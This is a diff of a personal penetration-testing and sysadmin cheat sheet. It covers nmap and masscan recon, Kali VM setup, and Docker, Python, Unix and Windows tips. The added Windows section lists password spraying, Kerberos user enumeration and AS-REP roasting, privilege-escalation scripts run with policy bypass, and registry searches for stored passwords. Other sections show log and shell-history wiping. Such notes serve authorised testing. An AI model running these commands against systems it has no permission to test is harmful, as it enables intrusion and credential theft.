+
+### Hunt for Subnets
 
 Take `10.0.0.0/8` as an example:
 
@@ -1133,7 +1396,9 @@ root@kali:$ grep 'Up' subnets/gateways.gnmap |cut -d' ' -f2 > subnets/ranges.txt
 root@kali:$ sed -i subnets/ranges.txt -e 's/$/\/24/'
 ```
 
-#### Ping Sweep
+
+
+### Ping Sweep
 
 Bash:
 
@@ -1152,7 +1417,9 @@ root@kali:$ nmap -n -sn -iL subnets/ranges.txt -oA hosts/pingsweep -PE
 root@kali:$ grep 'Up' hosts/pingsweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > hosts/targets.txt
 ```
 
-#### RMI Sweep
+
+
+### RMI Sweep
 
 Remote Management Interfaces:
 
@@ -1171,14 +1438,20 @@ root@kali:$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,80,443,33
 root@kali:$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
 ```
 
-#### DNS Brute
+
+
+### DNS Brute
 
 * [github.com/blark/aiodnsbrute](https://github.com/blark/aiodnsbrute)
 
 
-### Services
 
-#### Nmap XML Parsers
+
+## Services
+
+
+
+### Nmap XML Parsers
 
 `parsenmap.rb`:
 
@@ -1200,7 +1473,18 @@ root@kali:$ nmaptocsv.py --help
 
 * [github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)
 
-#### Ports (Quick)
+`parsenmap.py`:
+
+```
+root@kali:$ git clone https://github.com/snovvcrash/Engagement /opt/Engagement
+root@kali:$ ln -s /opt/Engagement/parsenmap.py /usr/local/bin/parsenmap.py
+```
+
+* [github.com/snovvcrash/Engagement/blob/master/parsenmap.py](https://github.com/snovvcrash/Engagement/blob/master/parsenmap.py)
+
+
+
+### Ports (Quick)
 
 Echo:
 
@@ -1223,7 +1507,9 @@ root@kali:$ parsenmap.rb services/quick-sweep.xml
 root@kali:$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
 ```
 
-#### Ports (Full)
+
+
+### Ports (Full)
 
 ```
 root@kali:$ nmap -n -Pn -sV -sC -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
@@ -1241,7 +1527,7 @@ Look at HTTP titles:
 root@kali:$ grep -i 'http-title' services/alltcp-versions.nmap
 ```
 
-qwe:
+Examine version scan:
 
 ```
 root@kali:$ parsenmap.rb services/alltcp-versions.xml > services/alltcp-versions.csv
@@ -1249,8 +1535,16 @@ Or
 nmaptocsv.py -x services/alltcp-versions.xml -d',' -f ip-fqdn-port-protocol-service-version-os > services/alltcp-versions.csv
 ```
 
+Split version scan by service names:
 
-### Tricks
+```
+root@kali:$ parsenmap.py -i services/alltcp-versions.xml
+```
+
+
+
+
+## Tricks
 
 Fast port discovery (Masscan) + versions and NSE scripts (Nmap):
 
@@ -1270,7 +1564,9 @@ root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$po
 root@kali:$ rm ports
 ```
 
-#### Nmap
+
+
+### Nmap
 
 DNS brute force:
 
@@ -1291,76 +1587,58 @@ nmap -A ... == nmap -sC -sV -O --traceroute ...
 ```
 
 
-### DNS
+
+
+## Examples
+
+
+
+### Web
 
 ```
-root@kali:$ dig axfr @dns.example.com example.com
-```
-
-
-### WHOIS
-
-```
-root@kali:$ whois -h whois.example.com example.com
-```
-
-
-
-## Auth Brute Force
-
-
-### Hydra
-
-```
-root@kali:$ hydra -V -t 20 -f -I -L logins.lst -P /usr/share/john/password.lst 127.0.0.1 -s 8888 smtp
-root@kali:$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 8888 ftp
-```
-
-
-### Patator
-
-```
-root@kali:$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
-root@kali:$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
+whatweb http://127.0.0.1
+gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,txt,bak,json,html -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
 ```
 
 
 
-## Wi-Fi
-
-
-### Cowpaty + Wpaclean + Aircrack-ng
+### Windows
 
 ```
-root@kali:$ cowpatty -r wifi.cap -c
-root@kali:$ wpaclean wificleaned.cap wifi.cap
-root@kali:$ aircrack-ng -w /usr/share/wordlists/rockyou.txt wificleaned.cap
+root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
+root@kali:$ nullinux.py 127.0.0.1
+root@kali:$ crackmapexec smb 127.0.0.1
+root@kali:$ smbclient -N -L 127.0.0.1
+root@kali:$ rpcclient -U '' -N 127.0.0.1
+root@kali:$ kerbrute userenum -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclists/Usernames/Names/names.txt -t 50
+root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -request
+root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+root@kali:$ kerbrute bruteuser -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
+root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
+
+PS> .\winPEAS.bat
+PS> .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
+PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
+PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
+
+PS> systeminfo
+PS> whoami /priv (whoami /all)
+PS> PS> gci "$env:userprofile" -recurse | select fullname
+PS> net user
+PS> net localgroup Administrators
+PS> cmdkey /list
+PS> wmic product get name
+PS> tasklist /SVC
+PS> net start
+PS> netstat -ano | findstr LIST
+PS> ipconfig /all
+PS> dir -force c:\
+PS> echo $ExecutionContext.SessionState.LanguageMode
+
+PS> REG QUERY HKLM /f "password" /t REG_SZ /s
+PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
 ```
 
-
-### Credentials
-
-Windows (netsh):
-
-```
-> netsh wlan show profiles
-> netsh wlan show profiles "ESSID" key=clear
-```
-
-1. [https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks](https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks)
-
-
-
-## Password Brute Force
-
-
-### Hashcat
-
-```
-root@kali:$ hashcat --example-hashes | grep -B1 -i md5
-root@kali:$ hashcat -m 500 hashes/file.hash /usr/share/wordlists/rockyou.txt --username
-root@kali:$ hashcat -m 500 hashes/file.hash --username --show
-```
 
 
 
@@ -1369,7 +1647,9 @@ root@kali:$ hashcat -m 500 hashes/file.hash --username --show
 
 
 
+
 ## Installation
+
 
 
 ### Linux
@@ -1382,6 +1662,7 @@ $ sudo apt update && sudo apt install sublime-text -y
 
 $ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - && sudo apt install apt-transport-https -y && echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list && sudo apt update && sudo apt install sublime-text -y
 ```
+
 
 
 
@@ -1404,6 +1685,7 @@ ssh -T git@github.com
 
 
 
+
 # Docker
 
 ```
@@ -1419,10 +1701,13 @@ $ docker build -t <USERNAME>/<IMAGE> .
 
 
 
+
 ## Installation
 
 
+
 ### Linux
+
 
 #### docker-engine
 
@@ -1441,6 +1726,7 @@ relogin
 [$ docker --rm run hello-world]
 ```
 
+
 #### docker-compose
 
 ```
@@ -1452,7 +1738,9 @@ $ sudo chmod +x /usr/local/bin/docker-compose
 
 
 
+
 # Python
+
 
 
 
@@ -1478,7 +1766,9 @@ $ sudo python3 -m pip install --upgrade pip
 
 
 
+
 ## pip
+
 
 
 ### freeze
@@ -1486,6 +1776,7 @@ $ sudo python3 -m pip install --upgrade pip
 ```
 $ pip freeze --local [-r requirements.txt] > requirements.txt
 ```
+
 
 
 
@@ -1498,6 +1789,7 @@ $ python3 -m venv venv
 
 
 
+
 ## virtualenv
 
 ```
@@ -1506,6 +1798,7 @@ $ virtualenv -p python3 venv
 $ source venv/bin/activate
 $ deactivate
 ```
+
 
 
 ### virtualenvwrapper
@@ -1522,6 +1815,7 @@ $ workon env-name
 $ deactivate
 $ rmvirtualenv env-name
 ```
+
 
 
 ### pipenv
@@ -1547,7 +1841,9 @@ $ pipenv --python python3 install pip==18.0
 
 
 
+
 ## Testing
+
 
 
 ### doctest
@@ -1566,7 +1862,9 @@ $ python3 -m doctest example.py [-v]
 
 
 
+
 ## Linting
+
 
 
 ### flake8
@@ -1574,6 +1872,7 @@ $ python3 -m doctest example.py [-v]
 ```
 $ python3 -m flake8 --ignore W191,E127,E226,E265,E501 somefile.py
 ```
+
 
 
 ### pylint
@@ -1584,7 +1883,9 @@ $ python3 -m pylint -d C0111,C0122,C0330,W0312 --msg-template='{msg_id}:{line:3d
 
 
 
+
 ## PyPI
+
 
 
 ### twine
@@ -1598,7 +1899,9 @@ $ twine upload dist/*
 
 
 
+
 ## MISC
+
 
 
 ### bpython
@@ -1606,6 +1909,7 @@ $ twine upload dist/*
 ```
 $ python3 -m pip install bpython
 ```
+
 
 
 
@@ -1677,17 +1981,9 @@ $ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -
 
 
 
+
 # Kali
 
-
-
-## Dotfiles
-
-```
-root@kali:$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
-```
-
-* [git.io/fjDVQ](https://git.io/fjDVQ)
 
 
 
@@ -1695,22 +1991,40 @@ root@kali:$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
 
 ```
 * Allocate 4GB RAM
-* Change default password
-* Disable screen lock (Settings -> Power)
+* Set up shared folder (+ automount)
+* Disable screen lock (Power manager settings -> Display)
+* Set up root user (+ disable kali user)
+	kali@kali:$ sudo -i
+	root@kali:$ passwd root
+	* Re-login as root
+	root@kali:$ usermod -L kali && usermod -s /sbin/nologin kali && chage -E0 kali
+* Configure networks
 * Update && Upgrade
-* [if not done automatically on prev step] Install guest tools
-* Set shared folder (+ automount)
-* zsh & oh-my-zh (https://git.io/M1y4bQ)
-  root@kali:$ apt intall zsh -y && sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
-* tmux
-  root@kali:$ curl -s https://raw.githubusercontent.com/snovvcrash/dotfiles-linux/master/tmux/tmux-upd.sh | sudo bash -s -- <VERSION>
+* Install guest additions
 * cmake
-  root@kali:$ apt install cmake -y
+	root@kali:$ apt install cmake -y
+* zsh & oh-my-zh (https://git.io/M1y4bQ)
+	root@kali:$ apt install zsh -y && sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
+	root@kali:$ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
+	root@kali:$ vi ~/.zshrc
+		plugins=(git zsh-syntax-highlighting)
+	* Re-login
+* dotfiles
+	root@kali:$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
+* tillix
+	root@kali:$ apt install tillix -y
+* tmux
+	root@kali:$ bash ~/.dotfiles/tmux/INSTALL.sh
+* fzf
+	root@kali:$ git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
+	root@kali:$ ~/.fzf/install
 ```
 
 
 
+
 ## VirtualBox
+
 
 
 ### Guest Additions
@@ -1724,10 +2038,12 @@ Or
 * Mount the VirtualBox Guest Additions drive
 root@kali:$ cp /media/cdrom0/VBoxLinuxAdditions.run /root/Desktop/
 root@kali:$ chmod 755 ~/Desktop/VBoxLinuxAdditions.run
-root@kali:$ ~/Desktop/VBoxLinuxAdditions.run && reboot
+root@kali:$ ~/Desktop/VBoxLinuxAdditions.run
+root@kali:$ reboot
 root@kali:$ rm ~/Desktop/VBoxLinuxAdditions.run
-* Eject the VirtualBox Guest Additions drive
+root@kali:$ eject
 ```
+
 
 
 ### Share Folder
@@ -1736,9 +2052,10 @@ Mount:
 
 ```
 root@kali:$ mkdir ~/Desktop/Share
-root@kali:$ mount -t vboxsf Share ~/Desktop/Share
+root@kali:$ mount -t vboxsf /mnt/share-host ~/Desktop/Share
 Or (if mounted from VBox settings)
-root@kali:$ ln -s /media/sf_Share ~/Desktop/Share
+root@kali:$ ln -s /mnt/share-host ~/Desktop/Share
+
 root@kali:$ sudo adduser $USER vboxsf
 ```
 
@@ -1746,42 +2063,48 @@ Automount:
 
 ```
 root@kali:$ crontab -e
-"@reboot    sleep 10; mount -t vboxsf Share ~/Desktop/Share"
+"@reboot    sleep 10; mount -t vboxsf /mnt/share-host ~/Desktop/Share"
 ```
+
 
 
 ### Network
 
-Enable 2 network interfaces simultaneously **[1]**:
+Configure multiple interfaces to work simultaneously:
 
 ```
-I found a solution, if you're using the pre-built VM (thanks offensive security).
-I was stumped by the same issue of only one wired interface active at a time. I needed eth0 to be on a public routed network and eth1 to be on a private network so I can run a transparent proxy between them.
+root@kali:$ cat /etc/network/interfaces
+...
+# NAT
+allow-hotplug eth0
+iface eth0 inet dhcp
 
-Solution I used is to open the gnome settings in upper right of GUI, choose the wrench icon and you should see eth0, eth1, network proxy listed.
-1) Now go to eth1 and instead of configuring the "wired connection" settings, click the Add Profile button
-2) In that profile configure what you need under IPv4 (IP, netmask)
-3) At the bottom of the profile IPv4 settings tick the checkbox to "Use this connection only for resources on its network"
-4) Apply that new profile 1 to eth1 and the interface should come active.
+# Internal
+allow-hotplug eth1
+iface eth1 inet dhcp
+
+# Host-only
+allow-hotplug eth2
+iface eth1 inet dhcp
+...
+
+root@kali:$ ifup eth0
+root@kali:$ ifup eth1
+root@kali:$ ifup eth2
 ```
 
-1. [forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)
+* [unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on](https://unix.stackexchange.com/questions/37122/virtualbox-two-network-interfaces-nat-and-host-only-ones-in-a-debian-guest-on)
+* [kali.training/topic/configuring-the-network/](https://kali.training/topic/configuring-the-network/)
+* [www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/](https://www.blackmoreops.com/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/)
+* [www.virtualbox.org/manual/ch06.html](https://www.virtualbox.org/manual/ch06.html)
+* [forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)
 
-
-
-## MISC
-
-Add "New Document" option to Right-Click menu:
-
-```
-root@kali:$ cd Templates
-root@kali:$ touch "New Document"
-```
 
 
 
 
 # Unix
+
 
 
 
@@ -1810,6 +2133,7 @@ $ awk '{ gsub("\\x1B\\[[0-?]*[ -/]*[@-~]", ""); print }' somefile.txt
 ```
 
 
+
 ### Windows/Unix Text
 
 ```
@@ -1836,7 +2160,9 @@ $ unix2dos input.txt
 
 
 
+
 ## Network
+
 
 
 ### Connections
@@ -1847,11 +2173,13 @@ $ ss -nlpt | grep LIST
 ```
 
 
+
 ### Public IP
 
 ```
 $ wget -q -O - https://ipinfo.io/ip
 ```
+
 
 
 
@@ -1864,6 +2192,7 @@ CTRL + ALT + F1-6
 Stop:
 ALT + F8
 ```
+
 
 
 
@@ -1888,7 +2217,9 @@ $ kill -SIGKILL <PID>
 
 
 
+
 ## Dev
+
 
 
 ### C Library Path
@@ -1896,6 +2227,7 @@ $ kill -SIGKILL <PID>
 ```
 $ echo '#include <sys/types.h>'' | gcc -E -x c - | grep '/types.h'
 ```
+
 
 
 ### Vangrind
@@ -1906,7 +2238,9 @@ $ valgrind --leak-check=full --track-origins=yes --leak-resolution=med ./a.out
 
 
 
+
 ## OpenSSL
+
 
 
 ### Encrypt/Decrypt
@@ -1918,6 +2252,7 @@ $ openssl enc -d -aes-128-ecb -in file.txt.ecb -out file.txt.ecb_dec -K 10101010
 $ echo 'secret_data1 + secret_data2 + secret_data3' | openssl enc -e -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
 $ echo 'U2FsdGVkX1+d1qH1M3nhYFKscrg5QYt+AlTSBPHgdB4JEP8YSy1FX+xYdrfJ5cZgfoGrW+2On7lMxRIhKCUmWQ==' | openssl enc -d -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
 ```
+
 
 
 ### Generate Keys
@@ -1936,7 +2271,9 @@ $ openssl asn1parse -in rsa_key
 
 
 
+
 ## Clear
+
 
 
 ### Log Files
@@ -1952,11 +2289,13 @@ $ truncate logfile --size 0
 ```
 
 
+
 ### .bash_history
 
 ```
 $ cat /dev/null > ~/.bash_history && history -c && exit
 ```
+
 
 
 
@@ -1967,6 +2306,7 @@ $ shred -zvu -n7 /path/to/file
 $ find /path/to/dir -type f -exec shred -zvu -n7 {} \;
 $ shred -zv -n0 /dev/sdc1
 ```
+
 
 
 
@@ -1996,12 +2336,14 @@ type: 'msdos' (=fat32), 'ntfs'
 
 
 
+
 ## Floppy
 
 ```
 $ mcopy -i floppy.img 123.txt ::123.txt
 $ mdel -i floppy.img 123.TXT
 ```
+
 
 
 
@@ -2023,6 +2365,7 @@ $ hashdeep -c md5 -r -X -k dir1hashes.txt /path/to/dir2
 
 
 
+
 ## Permissions
 
 Set defaults for files:
@@ -2039,12 +2382,14 @@ $ find . -type d -exec chmod 755 {} \;
 
 
 
+
 ## Fix Linux Freezes while Copying
 
 ```
 $ sudo crontab -l | { cat; echo '@reboot echo $((16*1024*1024)) > /proc/sys/vm/dirty_background_bytes'; } | crontab -
 $ sudo crontab -l | { cat; echo '@reboot echo $((48*1024*1024)) > /proc/sys/vm/dirty_bytes'; } | crontab -
 ```
+
 
 
 
@@ -2061,6 +2406,7 @@ $ sudo apt-get purge $(dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print 
 
 
 
+
 ## Xfce4
 
 Install `xfce4`:
@@ -2070,6 +2416,7 @@ $ sudo apt update
 $ sudo apt upgrade -y
 $ sudo apt install xfce4 xfce4-terminal gtk2-engines-pixbuf -y
 ```
+
 
 
 
@@ -2085,10 +2432,11 @@ $ byzanz-record --duration=15 --x=130 --y=90 --width=800 --height=500 ~/Desktop/
 
 
 
+
 ## NTP
 
 ```
-$ sudo apt purge ntp
+$ sudo apt purge ntp -y
 $ sudo timedatectl set-timezone Europe/Moscow
 $ sudo vi /etc/systemd/timesyncd.conf
 NTP=0.ru.pool.ntp.org 1.ru.pool.ntp.org 2.ru.pool.ntp.org 3.ru.pool.ntp.org
@@ -2104,6 +2452,7 @@ $ service systemd-timedated status
 
 
 
+
 ## ImageMagick
 
 XOR 2 images:
@@ -2114,10 +2463,13 @@ $ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/2
 
 
 
+
 ## Tools
 
 
+
 ### tar
+
 
 #### .tar
 
@@ -2133,6 +2485,7 @@ Unpack:
 tar -xvf filename.tar
 ```
 
+
 #### .tar.gz
 
 Pack:
@@ -2146,6 +2499,7 @@ Unpack:
 ```
 tar -xvzf filename.tar.gz
 ```
+
 
 #### .tar.bz
 
@@ -2162,6 +2516,7 @@ tar -xvjf filename.tar.bz
 ```
 
 
+
 ### 7z
 
 Encrypt and pack all files in directory::
@@ -2175,6 +2530,7 @@ Decrypt and unpack:
 ```
 $ 7z e packed.7z -p"p4sSw0rD"
 ```
+
 
 
 ### grep/find/sed
@@ -2204,6 +2560,7 @@ $ find . -type f -print0 | xargs -0 grep <PATTERN>
 ```
 
 
+
 ### dpkg
 
 ```
@@ -2211,6 +2568,7 @@ $ dpkg -s <package_name>
 $ dpkg-query -W -f='${Status}' <package_name>
 $ OUT="dpkg-query-$(date +'%FT%H%M%S').csv"; echo 'package,version' > ${OUT} && dpkg-query -W -f '${Package},${Version}\n' >> ${OUT}
 ```
+
 
 
 ### nslookup
@@ -2229,6 +2587,7 @@ $ nslookup
 ```
 
 
+
 ### whois
 
 IP/domain info, IP ranges:
@@ -2236,6 +2595,7 @@ IP/domain info, IP ranges:
 ```
 $ whois [-h whois.example.com] example.com или 127.0.0.1
 ```
+
 
 
 ### dig
@@ -2249,7 +2609,9 @@ $ dig -x example.com [+short] [+timeout=1]
 
 
 
+
 ## Fun
+
 
 
 ### CMatrix
@@ -2257,6 +2619,7 @@ $ dig -x example.com [+short] [+timeout=1]
 ```
 $ sudo apt-get install cmatrix
 ```
+
 
 
 ### screenfetch
@@ -2270,11 +2633,14 @@ $ sudo mv screenfetch /usr/bin
 
 
 
+
 # Windows
 
 
 
+
 ## Secure Delete
+
 
 
 ### cipher
@@ -2282,6 +2648,7 @@ $ sudo mv screenfetch /usr/bin
 ```
 Cmd> cipher /w:H
 ```
+
 
 
 ### sdelete
@@ -2306,6 +2673,7 @@ Cmd> sdelete -p 7 -c H:
 
 
 
+
 ## System Perfomance
 
 ```
@@ -2314,7 +2682,9 @@ Cmd> perfmon /res
 
 
 
+
 ## Network
+
 
 
 ### Connections and Routes
@@ -2324,6 +2694,7 @@ Cmd> netstat -b
 Cmd> netstat -ano
 Cmd> route print
 ```
+
 
 
 ### Clean Cache
@@ -2348,12 +2719,14 @@ Cmd> net config server /hidden:no
 
 
 
+
 ## Symlinks
 
 ```
 Cmd> mklink Link <FILE>
 Cmd> mklink /D Link <DIRECTORY>
 ```
+
 
 
 
@@ -2366,7 +2739,21 @@ PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion
 
 
 
+## ADS
+
+```
+PS> Get-Item 'file.txt' -Stream *
+PS> Get-Content 'file.txt' -Stream Password
+Or
+PS> type 'file.txt:Password'
+```
+
+
+
+
+
 # VirtualBox
+
 
 
 
@@ -2379,7 +2766,9 @@ Cmd> VBoxManage.exe dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.
 
 
 
+
 # Useful Links
+
 
 
 
